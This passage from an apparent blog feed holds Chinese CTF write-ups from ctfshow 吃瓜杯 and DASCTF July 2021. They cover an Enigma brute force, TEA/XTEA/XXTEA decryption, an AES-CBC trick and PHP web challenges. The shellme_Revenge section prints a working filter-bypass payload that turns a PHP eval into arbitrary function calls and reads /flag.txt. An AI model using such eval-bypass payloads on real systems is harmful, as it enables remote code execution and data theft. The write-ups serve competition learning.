class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">x = pickle.load(<span class="built_in">open</span>(<span class="string">&#x27;nimage.pickle&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line"></span><br><span class="line"><span class="comment">#&#123;&#x27;UMKEHRWALZE&#x27;: &#x27;B&#x27;, &#x27;WALZENLAGE&#x27;: &#x27;123&#x27;, &#x27;GRUNDSTELLUNG&#x27;: &#x27;WYF&#x27;, &#x27;RINGSTELLUNG&#x27;: &#x27;???&#x27;, &#x27;STECKERVERBINDUNGEN&#x27;: [&#x27;WO&#x27;, &#x27;DE&#x27;, &#x27;JB&#x27;, &#x27;HN&#x27;, &#x27;XI&#x27;], &#x27;KLARTEXT&#x27;: &#x27;CTFSHOW?????????????????????????????&#x27;, &#x27;GEHEIMTEXT&#x27;: &#x27;MXKXBTIOOZHFTGGTTPTRNXJUGASUTVBNSNGS&#x27;&#125;</span></span><br></pre></td></tr></table></figure><p>尝试用全脚本解密得到的结果有问题，再用pycipher工具解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pycipher <span class="keyword">import</span> Enigma</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">dic = string.ascii_uppercase</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> dic:</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> z <span class="keyword">in</span> dic:</span><br><span class="line">            eng = Enigma(settings=(<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;F&#x27;</span>),rotors=(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>),reflector=<span class="string">&#x27;B&#x27;</span>,</span><br><span class="line">                 ringstellung=(x,y,z),steckers=[(<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;O&#x27;</span>),(<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;E&#x27;</span>),</span><br><span class="line">                 (<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;B&#x27;</span>),(<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;N&#x27;</span>),(<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;I&#x27;</span>)])</span><br><span class="line">            flag = eng.decipher(<span class="string">&#x27;MXKXBTIOOZHFTGGTTPTRNXJUGASUTVBNSNGS&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> flag.startswith(<span class="string">&#x27;CTFSHOW&#x27;</span>):</span><br><span class="line">                <span class="built_in">print</span>((x,y,z),flag.lower())</span><br></pre></td></tr></table></figure><p>​    </p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="Tea-tube-pot"><a href="#Tea-tube-pot" class="headerlink" title="Tea_tube_pot"></a>Tea_tube_pot</h3><blockquote><p>三点几嚟，饮茶先啦！（给大佬递茶.jpg）</p></blockquote><p>flag分三部分。</p><p>第一部分 TEA加密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">v, k</span>):</span></span><br><span class="line">    v0 = v[<span class="number">0</span>]</span><br><span class="line">    v1 = v[<span class="number">1</span>]</span><br><span class="line">    x = <span class="number">0x9E3779B9</span> * <span class="number">32</span></span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    k0 = k[<span class="number">0</span>]</span><br><span class="line">    k1 = k[<span class="number">1</span>]</span><br><span class="line">    k2 = k[<span class="number">2</span>]</span><br><span class="line">    k3 = k[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3)</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1)</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        x -= delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">0</span>] = v0</span><br><span class="line">    v[<span class="number">1</span>] = v1</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    encrypted = [<span class="number">0x5FD744F6</span>,<span class="number">0x95832046</span>]</span><br><span class="line">    key = [<span class="number">0x73696854</span>, <span class="number">0x5F73695F</span>, <span class="number">0x74616574</span>, <span class="number">0x21656275</span>]</span><br><span class="line">    decrypted = decrypt(encrypted, key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(decrypted[<span class="number">1</span>])[<span class="number">2</span>:]+<span class="built_in">hex</span>(decrypted[<span class="number">0</span>])[<span class="number">2</span>:])[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># ENCrT1ny</span></span><br></pre></td></tr></table></figure><p>第二部分 XTEA加密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">rounds, v, k</span>):</span></span><br><span class="line">    v0 = v[<span class="number">0</span>]</span><br><span class="line">    v1 = v[<span class="number">1</span>]</span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    x = delta * rounds</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds):</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (x + k[(x &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>])</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        x -= delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (x + k[x &amp; <span class="number">3</span>])</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">0</span>] = v0</span><br><span class="line">    v[<span class="number">1</span>] = v1</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    encrypted = [<span class="number">0xFD731313</span>, <span class="number">0x6662CB90</span>]</span><br><span class="line">    key = [<span class="number">0x73696854</span>, <span class="number">0x5F73695F</span>, <span class="number">0x74616574</span>, <span class="number">0x21656275</span>]</span><br><span class="line">    rounds = <span class="number">32</span></span><br><span class="line">    decrypted = decrypt(rounds, encrypted, key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(decrypted[<span class="number">1</span>])[<span class="number">2</span>:]+<span class="built_in">hex</span>(decrypted[<span class="number">0</span>])[<span class="number">2</span>:])[::-<span class="number">1</span>])</span><br><span class="line">    </span><br><span class="line"><span class="comment"># yPti0nA1</span></span><br></pre></td></tr></table></figure><p>第三部分 XXTEA加密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shift</span>(<span class="params">z, y, x, k, p, e</span>):</span></span><br><span class="line">    <span class="keyword">return</span> ((((z &gt;&gt; <span class="number">5</span>) ^ (y &lt;&lt; <span class="number">2</span>)) + ((y &gt;&gt; <span class="number">3</span>) ^ (z &lt;&lt; <span class="number">4</span>))) ^ ((x ^ y) + (k[(p &amp; <span class="number">3</span>) ^ e] ^ z)))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">v, k</span>):</span></span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    n = <span class="built_in">len</span>(v)</span><br><span class="line">    rounds = <span class="number">6</span> + <span class="number">52</span> // n</span><br><span class="line">    x = (rounds * delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    y = v[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds):</span><br><span class="line">        e = (x &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">            z = v[p - <span class="number">1</span>]</span><br><span class="line">            v[p] = (v[p] - shift(z, y, x, k, p, e)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            y = v[p]</span><br><span class="line">        p -= <span class="number">1</span></span><br><span class="line">        z = v[n - <span class="number">1</span>]</span><br><span class="line">        v[<span class="number">0</span>] = (v[<span class="number">0</span>] - shift(z, y, x, k, p, e)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        y = v[<span class="number">0</span>]</span><br><span class="line">        x = (x - delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    encrypted = [<span class="number">0x4B136C82</span>, <span class="number">0x1A6E9613</span>]</span><br><span class="line">    key = [<span class="number">0x73696854</span>, <span class="number">0x5F73695F</span>, <span class="number">0x74616574</span>, <span class="number">0x21656275</span>]</span><br><span class="line">    decrypted = decrypt(encrypted, key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(decrypted[<span class="number">1</span>])[<span class="number">2</span>:]+<span class="built_in">hex</span>(decrypted[<span class="number">0</span>])[<span class="number">2</span>:])[::-<span class="number">1</span>])</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 9ori7hM!</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="wuqian"><a href="#wuqian" class="headerlink" title="wuqian"></a>wuqian</h3><p>ROP x64签到。然后签退。</p><p>​    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="热身"><a href="#热身" class="headerlink" title="热身"></a>热身</h3><blockquote><p>最简单的签到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!strpos(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>八进制绕过，前面加个字符：<code>?num=%0a010574</code>。</p><p>​    </p><h3 id="shellme"><a href="#shellme" class="headerlink" title="shellme"></a>shellme</h3><blockquote><p>还是熟悉的感觉</p></blockquote><p>phpinfo页面直接搜flag，很熟悉。</p><p>​    </p><h3 id="shellme-Revenge"><a href="#shellme-Revenge" class="headerlink" title="shellme_Revenge"></a>shellme_Revenge</h3><blockquote><p>由于上个题有严重的非预期，我的锅，在此给师傅们道歉了</p></blockquote><p>cookie 看到 hint=looklook，访问 <code>?looklook=1</code> 得到源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;looklook&#x27;</span>])&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    setcookie(<span class="string">&quot;hint&quot;</span>, <span class="string">&quot;?looklook&quot;</span>, time()+<span class="number">3600</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (is_string(<span class="variable">$ctfshow</span>) || strlen(<span class="variable">$ctfshow</span>) &lt;= <span class="number">107</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!preg_match(<span class="string">&quot;/[!@#%^&amp;*:&#x27;\&quot;|`a-zA-BD-Z~\\\\]|[4-9]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;fucccc hacker!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>禁用了很多 RCE 绕过姿势，未禁用 <code>$+_;?()[]&lt;&gt;</code>、字母<code>C</code> 和数字<code>0-3</code>，尝试用截断输出内容，用PHP自增特性生成其他字母：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$_=[];?&gt;&lt;?=$_ //真Array</span><br><span class="line">$_=([].C);?&gt;&lt;?=$_ //字符串ArrayC</span><br><span class="line">$_=([].C)[3];?&gt;&lt;?=$_ //字母a</span><br><span class="line">$_=([].C)[3];$_++;?&gt;&lt;?=$_ //字母b</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>根据PHP拼接特性，将需要的关键字拆分成字母，用自增特性生成，按照字母序生成可节省payload长度。</p><p>payload生成脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payload: xxxxxx?&gt;&lt;?=($_GET[0])($_GET[1]);</span></span><br><span class="line"></span><br><span class="line">alpha = <span class="built_in">list</span>(<span class="built_in">set</span>(need))</span><br><span class="line">alpha.sort()</span><br><span class="line"><span class="built_in">print</span>(alpha)</span><br><span class="line">greece = <span class="string">&#x27;α β γ δ ε ζ ν ξ ο π ρ σ η θ ι κ λ μ τ υ φ χ ψ ω Γ Δ&#x27;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">out = <span class="string">&#x27;$_=C;&#x27;</span></span><br><span class="line">cnt = <span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> alpha:</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">ord</span>(k)-<span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>) <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">now_php = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(k)-cnt):</span><br><span class="line">now_php += <span class="string">&#x27;$_++;&#x27;</span></span><br><span class="line">cnt += <span class="number">1</span></span><br><span class="line">icon = greece[<span class="built_in">ord</span>(k)-<span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>)]</span><br><span class="line">now_php += <span class="string">f&#x27;$<span class="subst">&#123;icon&#125;</span>=$_;&#x27;</span></span><br><span class="line">out += now_php</span><br><span class="line"></span><br><span class="line">func = []</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> need:</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">ord</span>(k)-<span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>) <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">icon = greece[<span class="built_in">ord</span>(k)-<span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>)]</span><br><span class="line">func += [<span class="string">f&#x27;$<span class="subst">&#123;icon&#125;</span>&#x27;</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">func += [k]</span><br><span class="line">func = <span class="string">&#x27;.&#x27;</span>.join(func)</span><br><span class="line"><span class="built_in">print</span>(func)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">f&#x27;<span class="subst">&#123;out&#125;</span>?&gt;&lt;?=($&#123;&#123;_.<span class="subst">&#123;func&#125;</span>&#125;&#125;[0])($&#123;&#123;_.<span class="subst">&#123;func&#125;</span>&#125;&#125;[1]);&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><p>POST：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctf_show = </span><br><span class="line">$_=([].C)[3];$α=$_;$_++;$_++;$_++;$_++;$ε=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$σ=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$χ=$_;$β=$ε.$χ.$α.$σ;$_=C;$_++;$_++;$γ=$_;$_++;$_++;$ε=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$μ=$_;($&#123;_.$ε.$γ.$μ&#125;[0])($&#123;_.$ε.$γ.$μ&#125;[1]);</span><br></pre></td></tr></table></figure><p>GET:</p><p><code>?looklook=1&amp;0=file_get_contents&amp;1=/flag.txt</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;比赛名称：ctfshow 吃瓜杯&lt;br&gt;题目范围：web pwn re misc crypto&lt;br&gt;题目难度：怎么简单怎么来&lt;br&gt;比赛奖励：ctfshow定制鼠标垫或萌妹手办&lt;br&gt;比赛时间：2021年8月14日(周六) 晚 7点7分&lt;br&gt;比</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2021赛" scheme="https://lazzzaro.github.io/tags/2021%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>2021DASCTF July X CBCTF 4th</title>
    <link href="https://lazzzaro.github.io/2021/08/01/match-2021DASCTF-July-X-CBCTF-4th/"/>
    <id>https://lazzzaro.github.io/2021/08/01/match-2021DASCTF-July-X-CBCTF-4th/</id>
    <published>2021-08-01T10:13:02.000Z</published>
    <updated>2021-08-02T15:57:40.821Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>2021 DASCTF实战精英夏令营预热赛<br>DASCTF July x CBCTF 4th<br>主办单位: 安恒信息、杭州电子科技大学网络空间安全学院<br>竞赛时间: 2021年7月31日10:00- 2021年8月1日18:00<br>报名时间: 2021年7月15日10:00-2021年7月31日10:00<br>报名地址: <a href="https://buuoj.cn/das">https://buuoj.cn/das</a><br>报名方式: 登录后点击[个人信息]完善个人信息&gt;点击[参与情况]创建战队-&gt;分享战队Token给自己的队员-&gt;等待比赛开始<br>竞赛方式: 团队赛(最多三人一组)<br>命题战队: 0rays </p><p>Rank: 42</p><hr><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="Yusa的密码学签到——BlockTrick"><a href="#Yusa的密码学签到——BlockTrick" class="headerlink" title="Yusa的密码学签到——BlockTrick"></a>Yusa的密码学签到——BlockTrick</h3><blockquote><p>好久不见，上课前先签个到叭！此题 nc 连接。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">a</span>):</span></span><br><span class="line">size = (<span class="number">16</span>-<span class="built_in">len</span>(a)%<span class="number">16</span>)%<span class="number">16</span></span><br><span class="line">a += <span class="built_in">chr</span>(size)*size</span><br><span class="line"><span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line">iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">key = os.urandom(<span class="number">16</span>)</span><br><span class="line">enc = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line"><span class="built_in">print</span>(iv.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">trick = raw_input(<span class="string">&quot;&quot;</span>)</span><br><span class="line">trick = pad(trick.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">cipher = enc.encrypt(trick)</span><br><span class="line"><span class="keyword">if</span> trick == cipher <span class="keyword">and</span> trick != <span class="string">&quot;&quot;</span> :</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line"><span class="built_in">print</span>(f.read())</span><br><span class="line">exit()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(cipher.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Try again&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">exit()</span><br></pre></td></tr></table></figure></blockquote><p>AES-CBC模式原理。</p><p>第一次：</p><p>令 <code>P0 = IV</code></p><p><code>C0 = Encrypt(P0 XOR IV) = Encrypt(0)</code></p><p>第二次：</p><p>令 <code>P1 = C0</code></p><p><code>C1 = Encrypt(P1 XOR C0) = Encrypt(C0 XOR C0) = Encrypt(0) = C0 = P1</code></p><p>​    </p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="red-vs-blue"><a href="#red-vs-blue" class="headerlink" title="red_vs_blue"></a>red_vs_blue</h3><blockquote><p>红队和蓝队将开展66轮对抗，你能预测出每轮对抗的结果吗？</p><p>nc连接</p></blockquote><p>同一次连接内，错误可以反复从头猜，66次随机结果不变，存储之前猜对的正确结果，错误时再重猜当前次数的另一种结果即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29203</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">ans=[<span class="string">&#x27;?&#x27;</span>]*<span class="number">67</span></span><br><span class="line"></span><br><span class="line">i=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> i&lt;=<span class="number">66</span>:</span><br><span class="line"><span 